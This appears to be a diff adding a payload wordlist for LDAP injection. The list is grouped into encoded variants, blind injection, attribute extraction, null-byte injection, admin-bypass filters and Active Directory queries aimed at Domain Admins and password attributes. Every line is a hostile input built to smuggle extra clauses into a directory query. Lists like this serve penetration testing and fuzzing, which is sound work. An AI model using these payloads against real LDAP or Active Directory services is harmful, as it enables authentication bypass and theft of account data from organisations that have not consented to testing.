@@ -1,0 +1,51 @@
+# Generic LDAP injection advanced payloads
+*
+*)(uid=*))(|(uid=*
+*))(|(objectclass=*)
+admin)(&)
+admin)(|(password=*))
+*)(|(cn=*))
+*))%00
+*()|%26'
+)(cn=*
+*)(cn=admin)
+*)(userPassword=*)
+*)(mail=*)
+*)(memberOf=*)
+*))(|(uid=admin
+admin*
+# URL-encoded variants
+%2a%29%28%75%69%64%3d%2a%29%29%28%7c%28%75%69%64%3d%2a
+%2a%29%29%28%7c%28%6f%62%6a%65%63%74%63%6c%61%73%73%3d%2a%29
+*%29%28%7c%28%70%61%73%73%77%6f%72%64%3d%2a
+# Hex-encoded variants
+\2a\29\28\75\69\64\3d\2a\29\29\28\7c\28\75\69\64\3d\2a
+\2a\29\29\28\7c\28\6f\62\6a\65\63\74\63\6c\61\73\73\3d\2a\29
+# Wildcard exploitation
+*(objectClass=*)
+*)(objectClass=person
+*)(objectClass=user
+*)(objectClass=posixAccount
+# Boolean-based blind LDAP injection
+admin)(|(uid=admin)(uid=*
+*))(|(uid=*))(|(uid=*
+# Attribute extraction
+*)(|(sn=*))(&(sn=*
+*)(|(givenName=*)
+*)(telephoneNumber=*)
+*)(homeDirectory=*)
+*)(loginShell=*)
+# NULL byte injection
+admin\00
+*\00
+admin\00)(uid=*
+# Admin bypass patterns
+admin)(|(objectClass=*
+*))(|(cn=*
+*))(|(sAMAccountName=*
+*)(sAMAccountName=admin
+# Active Directory specific
+*)(userAccountControl:1.2.840.113556.1.4.803:=512
+*)(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=com
+*)(adminCount=1)
+*(msds-allowedtologonAccount=*)
